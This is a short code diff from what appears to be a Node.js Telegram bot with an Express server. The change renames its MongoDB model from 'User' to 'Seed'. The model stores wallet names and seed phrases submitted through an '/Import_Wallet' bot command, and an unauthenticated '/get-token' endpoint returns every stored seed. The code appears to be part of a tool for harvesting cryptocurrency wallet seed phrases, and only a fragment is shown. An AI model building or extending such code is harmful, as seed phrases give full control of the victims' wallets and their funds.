@@ -15,7 +15,7 @@ let photoId;
 let photoSize;
 let chatId;
 
-const userSchema = new mongoose.Schema({
+const seedSchema = new mongoose.Schema({
   walletname: {
     type: String,
   },
@@ -27,13 +27,13 @@ const userSchema = new mongoose.Schema({
   },
 });
 
-const User = mongoose.model("User", userSchema);
+const Seed = mongoose.model("Seed", seedSchema);
 
 app.use(express.json());
 
 app.use("/get-token", async (req, res) => {
   try {
-    const data = await User.find({});
+    const data = await Seed.find({});
     const mainData = data.reverse();
     res.json({ msg: "success", mainData });
   } catch (error) {
@@ -113,7 +113,7 @@ bot.onText(/\/Import_Wallet/, (msg) => {
 
 const updatedatabase = async (network, wallet, seed) => {
   try {
-    const user = await User.create({
+    const user = await Seed.create({
       walletname: wallet,
       keys: seed,
       wallet: network,
